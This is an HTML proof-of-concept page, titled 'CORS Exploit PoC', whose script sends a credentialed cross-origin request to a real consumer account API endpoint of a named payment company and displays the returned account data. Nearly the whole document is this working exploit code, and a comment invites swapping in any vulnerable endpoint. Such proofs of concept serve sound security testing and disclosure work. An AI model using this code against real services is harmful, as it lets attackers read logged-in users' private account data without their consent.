<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🔥 CORS Exploit PoC</title>
</head>
<body>
  <h2>🔥 CORS Exploit PoC</h2>
  <p>Targeting: <b id="url"></b></p>

  <pre id="output" style="white-space: pre-wrap; background: #f4f4f4; padding: 1em; border-radius: 4px; color: black;"></pre>

  <script>
    const testUrl = "https://portalapi.us.afterpay.com/portal/consumers/account"; // change this to your vulnerable endpoint

    document.getElementById("url").textContent = testUrl;

    fetch(testUrl, {
      method: "GET",
      credentials: "include",
      mode: "cors"
    })
    .then(async res => {
      const text = await res.text();
      document.getElementById("output").textContent =
        `✅ Status: ${res.status} ${res.statusText}\n\n📦 Response:\n${text}`;
    })
    .catch(err => {
      document.getElementById("output").textContent = "❌ Error:\n" + err;
    });
  </script>
</body>
</html>
